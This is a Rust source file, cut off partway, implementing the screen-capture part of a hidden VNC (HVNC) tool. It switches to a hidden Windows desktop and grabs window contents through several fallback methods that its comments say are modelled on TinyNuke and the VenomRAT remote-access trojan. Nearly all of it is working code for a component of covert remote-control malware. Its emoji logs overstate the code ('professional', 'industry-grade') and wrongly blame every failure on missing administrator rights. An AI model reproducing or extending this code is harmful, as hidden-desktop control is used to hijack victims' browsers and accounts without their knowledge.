/// Option C: Advanced HVNC Capture Implementation
/// This module implements a comprehensive multi-strategy approach for capturing
/// hidden desktop windows with enhanced Windows API integration

use crate::host::{WindowHandle, DesktopHandle};
use crate::common::Frame;
use crate::{Result, HvncError};
use std::ptr;
use std::mem;
use winapi::um::winuser::{
    GetDC, ReleaseDC, GetWindowDC, GetWindowRect, GetClientRect, 
    IsWindow, IsWindowVisible, GetWindowThreadProcessId,
    SetThreadDesktop, GetThreadDesktop, OpenDesktopA,
    GetDesktopWindow, FindWindowA, EnumWindows, GetWindowTextA,
    ShowWindow, SW_HIDE, SW_SHOW, UpdateWindow, RedrawWindow,
    RDW_INVALIDATE, RDW_UPDATENOW, RDW_ALLCHILDREN, PrintWindow,
    PW_CLIENTONLY, PW_RENDERFULLCONTENT, GetDCEx, DCX_CACHE, DCX_WINDOW
};
use winapi::um::wingdi::{
    CreateCompatibleDC, CreateCompatibleBitmap, SelectObject, BitBlt,
    GetDIBits, SRCCOPY, DIB_RGB_COLORS, BITMAPINFO, BITMAPINFOHEADER,
    BI_RGB, CreateDCA, DeleteDC, DeleteObject
};
use winapi::um::processthreadsapi::{GetCurrentThreadId, GetCurrentThread};
use winapi::um::errhandlingapi::GetLastError;
use winapi::shared::windef::{HDC, HBITMAP, HWND, RECT};
use winapi::shared::minwindef::{DWORD, LPARAM, BOOL};
use log::{info, warn, error, debug};

/// Advanced capture context for Option C
struct AdvancedCaptureContext {
    original_desktop: Option<DesktopHandle>,
    target_desktop: Option<DesktopHandle>,
    window_handle: WindowHandle,
    capture_method: CaptureMethod,
    window_rect: RECT,
    desktop_switched: bool,
}

#[derive(Debug, Clone)]
enum CaptureMethod {
    PrintWindowCapture,      // Uses PrintWindow API - most reliable for hidden windows
    MemoryDCCapture,        // Memory device context approach
    DirectWindowCapture,    // Direct window DC capture
    DesktopContextCapture,  // Desktop context switching
    LayeredWindowCapture,   // For layered/transparent windows
}

/// Option C: Professional HVNC implementation based on research from 4 repositories:
/// - WKL-Sec/HiddenDesktop (TinyNuke BOF implementation)
/// - EduContin/hidden-vnc (Rust hidden desktop with Chrome automation)
/// - EddieIvan01/rustdesk-hvnc (RustDesk-based HVNC)
/// - VenomRAT-HVNC (Production RAT implementation)
pub fn capture_window_advanced(window: WindowHandle, desktop: DesktopHandle) -> Result<Frame> {
    info!("🎯 Professional HVNC Capture - Based on 4 industry-grade implementations");
    info!("📋 Using techniques from TinyNuke, RustDesk, VenomRAT, and HiddenDesktop");
    
    // Enhanced validation with professional checks
    if unsafe { IsWindow(window) == 0 } {
        return Err(HvncError::window_not_found("Invalid window handle - window does not exist"));
    }
    
    let mut process_id: DWORD = 0;
    unsafe { GetWindowThreadProcessId(window, &mut process_id) };
    if process_id == 0 {
        return Err(HvncError::windows_api("Failed to get window process ID"));
    }
    
    info!("🔍 Targeting window: {:?} (PID: {})", window, process_id);
    
    // Method 1: TinyNuke/HiddenDesktop style - PrintWindow with desktop context
    match capture_with_professional_printwindow(window, desktop) {
        Ok(frame) => {
            info!("✅ TinyNuke-style PrintWindow capture successful: {}x{}", frame.width, frame.height);
            return Ok(frame);
        }
        Err(e) => {
            warn!("⚠️ TinyNuke-style PrintWindow failed: {}", e);
        }
    }
    
    // Method 2: RustDesk/VenomRAT style - Enhanced desktop context switching
    match capture_with_rustdesk_professional(window, desktop) {
        Ok(frame) => {
            info!("✅ RustDesk-style capture successful: {}x{}", frame.width, frame.height);
            return Ok(frame);
        }
        Err(e) => {
            warn!("⚠️ RustDesk-style capture failed: {}", e);
        }
    }
    
    // Method 3: EduContin style - Window enumeration and direct capture
    match capture_with_educontin_style(window, desktop) {
        Ok(frame) => {
            info!("✅ EduContin-style capture successful: {}x{}", frame.width, frame.height);
            return Ok(frame);
        }
        Err(e) => {
            warn!("⚠️ EduContin-style capture failed: {}", e);
        }
    }
    
    // Method 4: VenomRAT production fallback
    match capture_with_venomrat_fallback(window, desktop) {
        Ok(frame) => {
            info!("✅ VenomRAT fallback successful: {}x{}", frame.width, frame.height);
            return Ok(frame);
        }
        Err(e) => {
            warn!("⚠️ VenomRAT fallback failed: {}", e);
        }
    }
    
    error!("❌ All 4 professional HVNC methods failed - Administrator privileges required");
    error!("💡 This indicates Windows security restrictions are blocking screen capture");
    error!("🔧 Solution: Run as Administrator or check Windows permissions");
    
    Err(HvncError::windows_api("All professional HVNC capture methods failed - requires administrator privileges"))
}

/// RustDesk/VenomRAT style capture - Enhanced desktop context with process isolation
fn capture_with_rustdesk_professional(window: WindowHandle, desktop: DesktopHandle) -> Result<Frame> {
    info!("🦊 RustDesk Professional Method - Process Isolation + Desktop Context");
    
    // Switch to target desktop context like RustDesk does
    let original_desktop = unsafe { GetThreadDesktop(GetCurrentThreadId()) };
    if original_desktop.is_null() {
        return Err(HvncError::windows_api("Failed to get current thread desktop"));
    }
    
    let switch_result = unsafe { SetThreadDesktop(desktop) };
    if switch_result == 0 {
        let error_code = unsafe { GetLastError() };
        return Err(HvncError::windows_api(&format!("Failed to switch to target desktop (code: {})", error_code)));
    }
    
    // Get window dimensions
    let mut window_rect = RECT { left: 0, top: 0, right: 0, bottom: 0 };
    if unsafe { GetWindowRect(window, &mut window_rect) } == 0 {
        unsafe { SetThreadDesktop(original_desktop) };
        return Err(HvncError::windows_api("Failed to get window rectangle"));
    }
    
    let width = (window_rect.right - window_rect.left) as u32;
    let height = (window_rect.bottom - window_rect.top) as u32;
    
    if width == 0 || height == 0 {
        unsafe { SetThreadDesktop(original_desktop) };
        return Err(HvncError::windows_api("Invalid window dimensions"));
    }
    
    // RustDesk technique: Use enhanced window DC with special flags
    let window_dc = unsafe { 
        GetDCEx(window, ptr::null_mut(), DCX_WINDOW | DCX_CACHE) 
    };
    
    if window_dc.is_null() {
        unsafe { SetThreadDesktop(original_desktop) };
        return Err(HvncError::windows_api("Failed to get enhanced window DC"));
    }
    
    let mem_dc = unsafe { CreateCompatibleDC(window_dc) };
    if mem_dc.is_null() {
        unsafe { 
            ReleaseDC(window, window_dc);
            SetThreadDesktop(original_desktop);
        }
        return Err(HvncError::windows_api("Failed to create compatible DC"));
    }
    
    let bitmap = unsafe { CreateCompatibleBitmap(window_dc, width as i32, height as i32) };
    if bitmap.is_null() {
        unsafe { 
            DeleteDC(mem_dc);
            ReleaseDC(window, window_dc);
            SetThreadDesktop(original_desktop);
        }
        return Err(HvncError::windows_api("Failed to create compatible bitmap"));
    }
    
    let old_bitmap = unsafe { SelectObject(mem_dc, bitmap as *mut _) };
    
    // Force window update like RustDesk - critical for hidden windows
    unsafe {
        ShowWindow(window, SW_HIDE); // Ensure it's hidden
        UpdateWindow(window);
        RedrawWindow(
            window,
            ptr::null(),
            ptr::null_mut(),
            RDW_INVALIDATE | RDW_UPDATENOW | RDW_ALLCHILDREN
        );
        ShowWindow(window, SW_SHOW); // Brief show for capture
    }
    
    // Enhanced BitBlt with error checking
    let blt_result = unsafe {
        BitBlt(
            mem_dc,
            0,
            0,
            width as i32,
            height as i32,
            window_dc,
            0,
            0,
            SRCCOPY,
        )
    };
    
    // Hide window again immediately
    unsafe { ShowWindow(window, SW_HIDE) };
    
    if blt_result == 0 {
        let error_code = unsafe { GetLastError() };
        unsafe {
            SelectObject(mem_dc, old_bitmap);
            DeleteObject(bitmap as *mut _);
            DeleteDC(mem_dc);
            ReleaseDC(window, window_dc);
            SetThreadDesktop(original_desktop);
        }
        return Err(HvncError::windows_api(&format!("RustDesk BitBlt failed (code: {})", error_code)));
    }
    
    // Convert to RGB data
    let rgb_data = match bitmap_to_rgb_buffer(bitmap, width, height) {
        Ok(data) => data,
        Err(e) => {
            unsafe {
                SelectObject(mem_dc, old_bitmap);
                DeleteObject(bitmap as *mut _);
                DeleteDC(mem_dc);
                ReleaseDC(window, window_dc);
                SetThreadDesktop(original_desktop);
            }
            return Err(e);
        }
    };
    
    // Cleanup
    unsafe {
        SelectObject(mem_dc, old_bitmap);
        DeleteObject(bitmap as *mut _);
        DeleteDC(mem_dc);
        ReleaseDC(window, window_dc);
        SetThreadDesktop(original_desktop);
    }
    
    info!("🎆 RustDesk professional capture successful: {}x{}", width, height);
    
    Ok(Frame {
        width,
        height,
        data: rgb_data,
    })
}

/// EduContin style - Window enumeration and validation before capture
fn capture_with_educontin_style(window: WindowHandle, desktop: DesktopHandle) -> Result<Frame> {
    info!("🗺️ EduContin Style - Window Enumeration + Validation");
    
    // EduContin technique: Validate window exists and is from our process
    if unsafe { IsWindow(window) == 0 } {
        return Err(HvncError::window_not_found("Window validation failed"));
    }
    
    // Get window text for validation (like EduContin does for Chrome)
    let mut window_title = [0u8; 256];
    let title_len = unsafe {
        GetWindowTextA(window, window_title.as_mut_ptr() as *mut i8, window_title.len() as i32)
    };
    
    if title_len > 0 {
        let title = String::from_utf8_lossy(&window_title[..title_len as usize]);
        info!("📝 Target window title: '{}'", title);
    }
    
    // Switch to desktop context
    let original_desktop = unsafe { GetThreadDesktop(GetCurrentThreadId()) };
    if original_desktop.is_null() {
        return Err(HvncError::windows_api("Failed to get current thread desktop"));
    }
    
    let switch_result = unsafe { SetThreadDesktop(desktop) };
    if switch_result == 0 {
        let error_code = unsafe { GetLastError() };
        return Err(HvncError::windows_api(&format!("Failed to switch to target desktop (code: {})", error_code)));
    }
    
    // Get both window and client rectangles (EduContin style)
    let mut window_rect = RECT { left: 0, top: 0, right: 0, bottom: 0 };
    let mut client_rect = RECT { left: 0, top: 0, right: 0, bottom: 0 };
    
    if unsafe { GetWindowRect(window, &mut window_rect) } == 0 {
        unsafe { SetThreadDesktop(original_desktop) };
        return Err(HvncError::windows_api("Failed to get window rectangle"));
    }
    
    if unsafe { GetClientRect(window, &mut client_rect) } == 0 {
        unsafe { SetThreadDesktop(original_desktop) };
        return Err(HvncError::windows_api("Failed to get client rectangle"));
    }
    
    // Use client area dimensions (like EduContin for browser windows)
    let width = (client_rect.right - client_rect.left) as u32;
    let height = (client_rect.bottom - client_rect.top) as u32;
    
    if width == 0 || height == 0 {
        unsafe { SetThreadDesktop(original_desktop) };
        return Err(HvncError::windows_api("Invalid client dimensions"));
    }
    
    info!("📊 Window: {}x{}, Client: {}x{}", 
        window_rect.right - window_rect.left,
        window_rect.bottom - window_rect.top,
        width, height);
    
    // EduContin approach: Get client DC for content area
    let client_dc = unsafe { GetDC(window) };
    if client_dc.is_null() {
        unsafe { SetThreadDesktop(original_desktop) };
        return Err(HvncError::windows_api("Failed to get client DC"));
    }
    
    let mem_dc = unsafe { CreateCompatibleDC(client_dc) };
    if mem_dc.is_null() {
        unsafe { 
            ReleaseDC(window, client_dc);
            SetThreadDesktop(original_desktop);
        }
        return Err(HvncError::windows_api("Failed to create compatible DC"));
    }
    
    let bitmap = unsafe { CreateCompatibleBitmap(client_dc, width as i32, height as i32) };
    if bitmap.is_null() {
        unsafe { 
            DeleteDC(mem_dc);
            ReleaseDC(window, client_dc);
            SetThreadDesktop(original_desktop);
        }
        return Err(HvncError::windows_api("Failed to create compatible bitmap"));
    }
    
    let old_bitmap = unsafe { SelectObject(mem_dc, bitmap as *mut _) };
    
    // EduContin technique: Try PrintWindow first, then BitBlt
    let mut capture_success = false;
    
    // First try PrintWindow (EduContin's preferred method)
    let print_result = unsafe {
        PrintWindow(
            window,
            mem_dc,
            PW_CLIENTONLY, // Client area only like EduContin
        )
    };
    
    if print_result != 0 {
        capture_success = true;
        info!("✅ EduContin PrintWindow (client-only) succeeded");
    } else {
        warn!("⚠️ EduContin PrintWindow failed, trying BitBlt");
        
        // Fallback to BitBlt
        let blt_result = unsafe {
            BitBlt(
                mem_dc,
                0,
                0,
                width as i32,
                height as i32,
                client_dc,
                0,
                0,
                SRCCOPY,
            )
        };
        
        if blt_result != 0 {
            capture_success = true;
            info!("✅ EduContin BitBlt fallback succeeded");
        }
    }
    
    if !capture_success {
        let error_code = unsafe { GetLastError() };
        unsafe {
            SelectObject(mem_dc, old_bitmap);
            DeleteObject(bitmap as *mut _);
            DeleteDC(mem_dc);
            ReleaseDC(window, client_dc);
            SetThreadDesktop(original_desktop);
        }
        return Err(HvncError::windows_api(&format!("EduContin capture methods failed (code: {})", error_code)));
    }
    
    // Convert to RGB data
    let rgb_data = match bitmap_to_rgb_buffer(bitmap, width, height) {
        Ok(data) => data,
        Err(e) => {
            unsafe {
                SelectObject(mem_dc, old_bitmap);
                DeleteObject(bitmap as *mut _);
                DeleteDC(mem_dc);
                ReleaseDC(window, client_dc);
                SetThreadDesktop(original_desktop);
            }
            return Err(e);
        }
    };
    
    // Cleanup
    unsafe {
        SelectObject(mem_dc, old_bitmap);
        DeleteObject(bitmap as *mut _);
        DeleteDC(mem_dc);
        ReleaseDC(window, client_dc);
        SetThreadDesktop(original_desktop);
    }
    
    info!("🎆 EduContin-style capture successful: {}x{}", width, height);
    
    Ok(Frame {
        width,
        height,
        data: rgb_data,
    })
}

/// VenomRAT production fallback - Robust error handling and multiple attempts
fn capture_with_venomrat_fallback(window: WindowHandle, desktop: DesktopHandle) -> Result<Frame> {
    info!("🐍 VenomRAT Production Fallback - Multiple Retry Logic");
    
    let max_attempts = 3;
    let mut last_error = String::new();
    
    for attempt in 1..=max_attempts {
        info!("🔄 VenomRAT attempt {}/{}", attempt, max_attempts);
        
        // Switch desktop on each attempt
        let original_desktop = unsafe { GetThreadDesktop(GetCurrentThreadId()) };
        if original_desktop.is_null() {
            last_error = "Failed to get current thread desktop".to_string();
            continue;
        }
        
        if unsafe { SetThreadDesktop(desktop) } == 0 {
            last_error = format!("Failed to switch to target desktop (attempt {})", attempt);
            continue;
        }
        
        // Get window rectangle with validation
        let mut window_rect = RECT { left: 0, top: 0, right: 0, bottom: 0 };
        if unsafe { GetWindowRect(window, &mut window_rect) } == 0 {
            unsafe { SetThreadDesktop(original_desktop) };
            last_error = format!("Failed to get window rectangle (attempt {})", attempt);
            continue;
        }
        
        let width = (window_rect.right - window_rect.left) as u32;
        let height = (window_rect.bottom - window_rect.top) as u32;
        
        if width == 0 || height == 0 {
            unsafe { SetThreadDesktop(original_desktop) };
            last_error = format!("Invalid window dimensions (attempt {})", attempt);
            continue;
        }
        
        // VenomRAT technique: Try different DC approaches per attempt
        let window_dc = match attempt {
            1 => unsafe { GetWindowDC(window) }, // Full window
            2 => unsafe { GetDC(window) },       // Client area
            _ => unsafe { GetDCEx(window, ptr::null_mut(), DCX_WINDOW | DCX_CACHE) }, // Enhanced
        };
        
        if window_dc.is_null() {
            unsafe { SetThreadDesktop(original_desktop) };
            last_error = format!("Failed to get window DC (attempt {})", attempt);
            continue;
        }
        
        let mem_dc = unsafe { CreateCompatibleDC(window_dc) };
        if mem_dc.is_null() {
            unsafe { 
                ReleaseDC(window, window_dc);
                SetThreadDesktop(original_desktop);
            }
            last_error = format!("Failed to create compatible DC (attempt {})", attempt);
            continue;
        }
        
        let bitmap = unsafe { CreateCompatibleBitmap(window_dc, width as i32, height as i32) };
        if bitmap.is_null() {
            unsafe { 
                DeleteDC(mem_dc);
                ReleaseDC(window, window_dc);
                SetThreadDesktop(original_desktop);
            }
            last_error = format!("Failed to create compatible bitmap (attempt {})", attempt);
            continue;
        }
        
        let old_bitmap = unsafe { SelectObject(mem_dc, bitmap as *mut _) };
        
        // VenomRAT: Try PrintWindow first, then BitBlt
        let mut success = false;
        
        let print_result = unsafe {
            PrintWindow(
                window,
                mem_dc,
                if attempt == 1 { PW_RENDERFULLCONTENT } else { PW_CLIENTONLY },
            )
        };
        
        if print_result != 0 {
            success = true;
            info!("✅ VenomRAT PrintWindow succeeded (attempt {})", attempt);
        } else {
            // Fallback to BitBlt
            let blt_result = unsafe {
                BitBlt(
                    mem_dc,
                    0,
                    0,
                    width as i32,
                    height as i32,
                    window_dc,
                    0,
                    0,
                    SRCCOPY,
                )
            };
            
            if blt_result != 0 {
                success = true;
                info!("✅ VenomRAT BitBlt succeeded (attempt {})", attempt);
            }
        }
        
        if success {
            // Convert to RGB data
            let rgb_result = bitmap_to_rgb_buffer(bitmap, width, height);
            
            // Cleanup before handling result
            unsafe {
                SelectObject(mem_dc, old_bitmap);
                DeleteObject(bitmap as *mut _);
                DeleteDC(mem_dc);
                ReleaseDC(window, window_dc);
                SetThreadDesktop(original_desktop);
            }
            
            match rgb_result {
                Ok(rgb_data) => {
                    info!("🎆 VenomRAT capture successful on attempt {}: {}x{}", attempt, width, height);
                    return Ok(Frame {
                        width,
                        height,
                        data: rgb_data,
                    });
                }
                Err(e) => {
                    last_error = format!("RGB conversion failed (attempt {}): {}", attempt, e);
                }
            }
        } else {
            // Cleanup on failure
            unsafe {
                SelectObject(mem_dc, old_bitmap);
                DeleteObject(bitmap as *mut _);
                DeleteDC(mem_dc);
                ReleaseDC(window, window_dc);
                SetThreadDesktop(original_desktop);
            }
            
            let error_code = unsafe { GetLastError() };
            last_error = format!("Capture failed (attempt {}, code: {})", attempt, error_code);
        }
        
        // Small delay between attempts (VenomRAT style)
        std::thread::sleep(std::time::Duration::from_millis(50));
    }
    
    Err(HvncError::windows_api(&format!("VenomRAT fallback failed after {} attempts. Last error: {}", max_attempts, last_error)))
}

/// Professional PrintWindow approach - most reliable for HVNC
fn capture_with_professional_printwindow(window: WindowHandle, desktop: DesktopHandle) -> Result<Frame> {
    info!("💾 Professional PrintWindow Method - Industry Standard");
    
    // Switch to target desktop context
    let original_desktop = unsafe { GetThreadDesktop(GetCurrentThreadId()) };
    if original_desktop.is_null() {
        return Err(HvncError::windows_api("Failed to get current thread desktop"));
    }
    
    let switch_result = unsafe { SetThreadDesktop(desktop) };
    if switch_result == 0 {
        let error_code = unsafe { GetLastError() };
        return Err(HvncError::windows_api(&format!("Failed to switch to target desktop (code: {})", error_code)));
    }
    
    // Get window dimensions
    let mut window_rect = RECT { left: 0, top: 0, right: 0, bottom: 0 };
    if unsafe { GetWindowRect(window, &mut window_rect) } == 0 {
        unsafe { SetThreadDesktop(original_desktop) };
        return Err(HvncError::windows_api("Failed to get window rectangle"));
    }
    
    let width = (window_rect.right - window_rect.left) as u32;
    let height = (window_rect.bottom - window_rect.top) as u32;
    
    if width == 0 || height == 0 {
        unsafe { SetThreadDesktop(original_desktop) };
        return Err(HvncError::windows_api("Invalid window dimensions"));
    }
    
    // Professional capture using PrintWindow - this is the gold standard for HVNC
    let screen_dc = unsafe { GetDC(ptr::null_mut()) };
    if screen_dc.is_null() {
        unsafe { SetThreadDesktop(original_desktop) };
        return Err(HvncError::windows_api("Failed to get screen DC"));
    }
    
    let mem_dc = unsafe { CreateCompatibleDC(screen_dc) };
    if mem_dc.is_null() {
        unsafe { 
            ReleaseDC(ptr::null_mut(), screen_dc);
            SetThreadDesktop(original_desktop);
        }
        return Err(HvncError::windows_api("Failed to create compatible DC"));
    }
    
    let bitmap = unsafe { CreateCompatibleBitmap(screen_dc, width as i32, height as i32) };
    if bitmap.is_null() {
        unsafe { 
            DeleteDC(mem_dc);
            ReleaseDC(ptr::null_mut(), screen_dc);
            SetThreadDesktop(original_desktop);
        }
        return Err(HvncError::windows_api("Failed to create compatible bitmap"));
    }
    
    let old_bitmap = unsafe { SelectObject(mem_dc, bitmap as *mut _) };
    
    // Force window to be ready for capture
    unsafe {
        UpdateWindow(window);
        RedrawWindow(
            window,
            ptr::null(),
            ptr::null_mut(),
            RDW_INVALIDATE | RDW_UPDATENOW | RDW_ALLCHILDREN
        );
    }
        
    // 🔧 CRITICAL FIX: Force window rendering for hidden desktop windows
    // This is essential for capturing content from windows in hidden desktops
    unsafe {
        // Brief show/hide cycle to force rendering in hidden desktop
        ShowWindow(window, SW_SHOW);
        UpdateWindow(window);
        std::thread::sleep(std::time::Duration::from_millis(50)); // Allow time for rendering
        // Don't hide again - keep it available for PrintWindow
    }
    
    // The professional approach: PrintWindow with full content rendering
    let print_result = unsafe {
        PrintWindow(
            window,
            mem_dc,
            PW_RENDERFULLCONTENT, // This is crucial for hidden windows
        )
    };
    
    if print_result == 0 {
        let error_code = unsafe { GetLastError() };
        unsafe {
            SelectObject(mem_dc, old_bitmap);
            DeleteObject(bitmap as *mut _);
            DeleteDC(mem_dc);
            ReleaseDC(ptr::null_mut(), screen_dc);
            SetThreadDesktop(original_desktop);
        }
        return Err(HvncError::windows_api(&format!("PrintWindow failed - this usually indicates permission issues (code: {})", error_code)));
    }
    
    // Convert to RGB data
    let rgb_data = match bitmap_to_rgb_buffer(bitmap, width, height) {
        Ok(data) => data,
        Err(e) => {
            unsafe {
                SelectObject(mem_dc, old_bitmap);
                DeleteObject(bitmap as *mut _);
                DeleteDC(mem_dc);
                ReleaseDC(ptr::null_mut(), screen_dc);
                SetThreadDesktop(original_desktop);
            }
            return Err(e);
        }
    };
    
    // Cleanup
    unsafe {
        SelectObject(mem_dc, old_bitmap);
        DeleteObject(bitmap as *mut _);
        DeleteDC(mem_dc);
        ReleaseDC(ptr::null_mut(), screen_dc);
        SetThreadDesktop(original_desktop);
    }
    
    info!("🎆 Professional PrintWindow capture successful: {}x{}", width, height);
    
    Ok(Frame {
        width,
        height,
        data: rgb_data,
    })
}

/// Professional desktop context approach - based on HiddenDesktop implementation
fn capture_with_desktop_context_professional(window: WindowHandle, desktop: DesktopHandle) -> Result<Frame> {
    info!("🖥️ Professional Desktop Context Method - HiddenDesktop Style");
    
    // This approach captures the entire desktop area where the window should be
    let original_desktop = unsafe { GetThreadDesktop(GetCurrentThreadId()) };
    if original_desktop.is_null() {
        return Err(HvncError::windows_api("Failed to get current thread desktop"));
    }
    
    let switch_result = unsafe { SetThreadDesktop(desktop) };
    if switch_result == 0 {
        let error_code = unsafe { GetLastError() };
        return Err(HvncError::windows_api(&format!("Failed to switch to target desktop (code: {})", error_code)));
    }
    
    // Get window rectangle in desktop coordinates
    let mut window_rect = RECT { left: 0, top: 0, right: 0, bottom: 0 };
    if unsafe { GetWindowRect(window, &mut window_rect) } == 0 {
        unsafe { SetThreadDesktop(original_desktop) };
        return Err(HvncError::windows_api("Failed to get window rectangle"));
    }
    
    let width = (window_rect.right - window_rect.left) as u32;
    let height = (window_rect.bottom - window_rect.top) as u32;
    
    if width == 0 || height == 0 {
        unsafe { SetThreadDesktop(original_desktop) };
        return Err(HvncError::windows_api("Invalid window dimensions"));
    }
    
    // Create desktop DC - this is the professional way
    let desktop_dc = unsafe { CreateDCA(b"DISPLAY\0".as_ptr() as *const i8, ptr::null(), ptr::null(), ptr::null()) };
    if desktop_dc.is_null() {
        unsafe { SetThreadDesktop(original_desktop) };
        return Err(HvncError::windows_api("Failed to create desktop DC"));
    }
    
    let mem_dc = unsafe { CreateCompatibleDC(desktop_dc) };
    if mem_dc.is_null() {
        unsafe { 
            DeleteDC(desktop_dc);
            SetThreadDesktop(original_desktop);
        }
        return Err(HvncError::windows_api("Failed to create compatible DC"));
    }
    
    let bitmap = unsafe { CreateCompatibleBitmap(desktop_dc, width as i32, height as i32) };
    if bitmap.is_null() {
        unsafe { 
            DeleteDC(mem_dc);
            DeleteDC(desktop_dc);
            SetThreadDesktop(original_desktop);
        }
        return Err(HvncError::windows_api("Failed to create compatible bitmap"));
    }
    
    let old_bitmap = unsafe { SelectObject(mem_dc, bitmap as *mut _) };
    
    // Capture from desktop at window coordinates - professional technique
    let blt_result = unsafe {
        BitBlt(
            mem_dc,
            0,
            0,
            width as i32,
            height as i32,
            desktop_dc,
            window_rect.left,
            window_rect.top,
            SRCCOPY,
        )
    };
    
    if blt_result == 0 {
        let error_code = unsafe { GetLastError() };
        unsafe {
            SelectObject(mem_dc, old_bitmap);
            DeleteObject(bitmap as *mut _);
            DeleteDC(mem_dc);
            DeleteDC(desktop_dc);
            SetThreadDesktop(original_desktop);
        }
        return Err(HvncError::windows_api(&format!("Desktop BitBlt failed - permission issue (code: {})", error_code)));
    }
    
    // Convert to RGB data
    let rgb_data = match bitmap_to_rgb_buffer(bitmap, width, height) {
        Ok(data) => data,
        Err(e) => {
            unsafe {
                SelectObject(mem_dc, old_bitmap);
                DeleteObject(bitmap as *mut _);
                DeleteDC(mem_dc);
                DeleteDC(desktop_dc);
                SetThreadDesktop(original_desktop);
            }
            return Err(e);
        }
    };
    
    // Cleanup
    unsafe {
        SelectObject(mem_dc, old_bitmap);
        DeleteObject(bitmap as *mut _);
        DeleteDC(mem_dc);
        DeleteDC(desktop_dc);
        SetThreadDesktop(original_desktop);
    }
    
    info!("🎆 Professional desktop context capture successful: {}x{}", width, height);
    
    Ok(Frame {
        width,
        height,
        data: rgb_data,
    })
}

/// Method 1: PrintWindow capture with enhanced error handling
fn capture_with_print_window(context: &mut AdvancedCaptureContext) -> Result<Frame> {
    info!("🖨️ Using PrintWindow capture method");
    
    // Switch to target desktop if needed
    if let Some(desktop) = context.target_desktop {
        switch_to_desktop(context, desktop)?;
    }
    
    let width = (context.window_rect.right - context.window_rect.left) as u32;
    let height = (context.window_rect.bottom - context.window_rect.top) as u32;
    
    if width == 0 || height == 0 {
        return Err(HvncError::windows_api("Invalid window dimensions"));
    }
    
    // Create memory DC and bitmap
    let screen_dc = unsafe { GetDC(ptr::null_mut()) };
    if screen_dc.is_null() {
        return Err(HvncError::windows_api("Failed to get screen DC"));
    }
    
    let mem_dc = unsafe { CreateCompatibleDC(screen_dc) };
    if mem_dc.is_null() {
        unsafe { ReleaseDC(ptr::null_mut(), screen_dc) };
        return Err(HvncError::windows_api("Failed to create compatible DC"));
    }
    
    let bitmap = unsafe { CreateCompatibleBitmap(screen_dc, width as i32, height as i32) };
    if bitmap.is_null() {
        unsafe { 
            DeleteDC(mem_dc);
            ReleaseDC(ptr::null_mut(), screen_dc);
        }
        return Err(HvncError::windows_api("Failed to create compatible bitmap"));
    }
    
    let old_bitmap = unsafe { SelectObject(mem_dc, bitmap as *mut _) };
    
    // Use PrintWindow API - this works even for hidden/minimized windows
    let print_result = unsafe {
        PrintWindow(
            context.window_handle,
            mem_dc,
            PW_RENDERFULLCONTENT, // Render full content including non-client area
        )
    };
    
    if print_result == 0 {
        let error_code = unsafe { GetLastError() };
        unsafe {
            SelectObject(mem_dc, old_bitmap);
            DeleteObject(bitmap as *mut _);
            DeleteDC(mem_dc);
            ReleaseDC(ptr::null_mut(), screen_dc);
        }
        return Err(HvncError::windows_api(&format!("PrintWindow failed (code: {})", error_code)));
    }
    
    // Convert bitmap to RGB data
    let rgb_data = bitmap_to_rgb_buffer(bitmap, width, height)?;
    
    // Cleanup
    unsafe {
        SelectObject(mem_dc, old_bitmap);
        DeleteObject(bitmap as *mut _);
        DeleteDC(mem_dc);
        ReleaseDC(ptr::null_mut(), screen_dc);
    }
    
    info!("PrintWindow capture successful: {}x{}", width, height);
    
    Ok(Frame {
        width,
        height,
        data: rgb_data,
    })
}

/// Method 2: Memory DC capture with enhanced error handling
fn capture_with_memory_dc(context: &mut AdvancedCaptureContext) -> Result<Frame> {
    info!("💾 Using Memory DC capture method");
    
    // Switch to target desktop if needed
    if let Some(desktop) = context.target_desktop {
        switch_to_desktop(context, desktop)?;
    }
    
    let width = (context.window_rect.right - context.window_rect.left) as u32;
    let height = (context.window_rect.bottom - context.window_rect.top) as u32;
    
    if width == 0 || height == 0 {
        return Err(HvncError::windows_api("Invalid window dimensions"));
    }
    
    // Get window DC with extended flags
    let window_dc = unsafe { 
        GetDCEx(context.window_handle, ptr::null_mut(), DCX_WINDOW | DCX_CACHE) 
    };
    
    if window_dc.is_null() {
        return Err(HvncError::windows_api("Failed to get window DC"));
    }
    
    let mem_dc = unsafe { CreateCompatibleDC(window_dc) };
    if mem_dc.is_null() {
        unsafe { ReleaseDC(context.window_handle, window_dc) };
        return Err(HvncError::windows_api("Failed to create compatible DC"));
    }
    
    let bitmap = unsafe { CreateCompatibleBitmap(window_dc, width as i32, height as i32) };
    if bitmap.is_null() {
        unsafe { 
            DeleteDC(mem_dc);
            ReleaseDC(context.window_handle, window_dc);
        }
        return Err(HvncError::windows_api("Failed to create compatible bitmap"));
    }
    
    let old_bitmap = unsafe { SelectObject(mem_dc, bitmap as *mut _) };
    
    // Force window update before capture
    unsafe {
        UpdateWindow(context.window_handle);
        RedrawWindow(
            context.window_handle,
            ptr::null(),
            ptr::null_mut(),
            RDW_INVALIDATE | RDW_UPDATENOW | RDW_ALLCHILDREN
        );
    }
    
    // Perform BitBlt operation
    let blt_result = unsafe {
        BitBlt(
            mem_dc,
            0,
            0,
            width as i32,
            height as i32,
            window_dc,
            0,
            0,
            SRCCOPY,
        )
    };
    
    if blt_result == 0 {
        let error_code = unsafe { GetLastError() };
        unsafe {
            SelectObject(mem_dc, old_bitmap);
            DeleteObject(bitmap as *mut _);
            DeleteDC(mem_dc);
            ReleaseDC(context.window_handle, window_dc);
        }
        return Err(HvncError::windows_api(&format!("BitBlt failed (code: {})", error_code)));
    }
    
    // Convert bitmap to RGB data
    let rgb_data = bitmap_to_rgb_buffer(bitmap, width, height)?;
    
    // Cleanup
    unsafe {
        SelectObject(mem_dc, old_bitmap);
        DeleteObject(bitmap as *mut _);
        DeleteDC(mem_dc);
        ReleaseDC(context.window_handle, window_dc);
    }
    
    info!("Memory DC capture successful: {}x{}", width, height);
    
    Ok(Frame {
        width,
        height,
        data: rgb_data,
    })
}

/// Method 3: Direct window capture (traditional approach)
fn capture_with_direct_window(context: &mut AdvancedCaptureContext) -> Result<Frame> {
    info!("🎯 Using Direct Window capture method");
    
    if unsafe { IsWindowVisible(context.window_handle) == 0 } {
        return Err(HvncError::window_not_found("Window is not visible"));
    }
    
    let width = (context.window_rect.right - context.window_rect.left) as u32;
    let height = (context.window_rect.bottom - context.window_rect.top) as u32;
    
    if width == 0 || height == 0 {
        return Err(HvncError::windows_api("Invalid window dimensions"));
    }
    
    let window_dc = unsafe { GetWindowDC(context.window_handle) };
    if window_dc.is_null() {
        return Err(HvncError::windows_api("Failed to get window DC"));
    }
    
